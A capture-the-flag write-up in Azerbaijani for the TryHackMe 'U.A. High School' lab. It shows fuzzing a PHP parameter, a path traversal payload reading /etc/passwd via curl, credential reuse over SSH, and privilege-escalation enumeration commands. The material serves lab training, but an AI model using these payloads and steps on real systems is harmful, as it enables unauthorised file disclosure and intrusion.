# TryHackMe — U.A. High School Write-up

> Yalnız TryHackMe laboratoriyası üçündür. `TARGET_IP` və `ATTACKER_IP` dəyərlərini öz mühitinə uyğun dəyiş.

## Hücum zənciri

`Web enumeration → PHP endpoint → parameter fuzzing → file disclosure → credential → SSH → user flag → privilege escalation`

## 1. Nmap

```bash
nmap -sC -sV -p- -T4 TARGET_IP -oN nmap.txt
```

Əsas xidmətlər adətən `80/tcp HTTP` və `22/tcp SSH` olur. Əvvəlcə web serveri araşdır.

## 2. Web enumeration

```bash
gobuster dir -u http://TARGET_IP/ \
 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Ana səhifədə contact form və ya PHP əsaslı endpoint görünür. Source koduna baxanda formun istifadə etdiyi PHP faylının adı müəyyən edilir.

## 3. Parameter fuzzing

Tapılan PHP faylında hansı parameter adının istifadə edildiyi dərhal görünməyə bilər. Parameter adlarını yoxlamaq üçün:

```bash
ffuf -u 'http://TARGET_IP/page.php?FUZZ=test' \
 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 -fs RESPONSE_SIZE
```

Fərqli ölçüdə cavab verən parameter əsas namizəddir. Parameter qəbul etdikdən sonra onun hansı faylı və ya dəyəri serverə verdiyini analiz et.

## 4. Fayl oxuma / informasiya sızması

Endpoint lokal fayl adı qəbul edirsə, tətbiqdə path traversal və ya local file read yoxla:

```text
../../../../etc/passwd
```

Nəticə qaytarılarsa, tətbiqin işlədiyi qovluqları və config fayllarını araşdır. Web source, backup faylları və credential saxlayan fayllar əsas hədəfdir.

```bash
curl -i 'http://TARGET_IP/page.php?PARAMETER=../../../../etc/passwd'
```

Bu mərhələdə web tətbiqində istifadə olunan credential tapılır. Eyni parol SSH üçün təkrar istifadə edilmiş ola bilər.

## 5. SSH ilə giriş

```bash
ssh USER@TARGET_IP
```

Daxil olduqdan sonra:

```bash
whoami
id
pwd
ls -la
cat user.txt
```

## 6. Linux privilege escalation enumeration

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -lntup
ps aux
cat /etc/crontab
```

Həmçinin yazıla bilən faylları tap:

```bash
find /opt /usr/local /var/www -type f -writable 2>/dev/null
```

`sudo -l` nəticəsində xüsusi proqram və ya script görünürsə, həmin proqramın necə işlədiyini oxu. SUID binary tapıldıqda `strings`, `file` və `ldd` ilə analiz et.

## 7. Root flag

Privilege escalation yolunu tətbiq etdikdən sonra:

```bash
whoami
id
cat /root/root.txt
```

## Əsas dərslər

- PHP endpoint-lərində parameter fuzzing vacibdir.
- Source code formun hansı fayla sorğu göndərdiyini göstərə bilər.
- Fayl oxuma zəifliyində əvvəlcə `/etc/passwd`, sonra config və backup faylları yoxlanılır.
- Tapılan credential-ləri yalnız icazəli laboratoriyada digər xidmətlərdə yoxlamaq olar.
- SSH-dən sonra `sudo -l`, SUID, cron, process və writable fayllar standart yoxlama siyahısına daxildir.
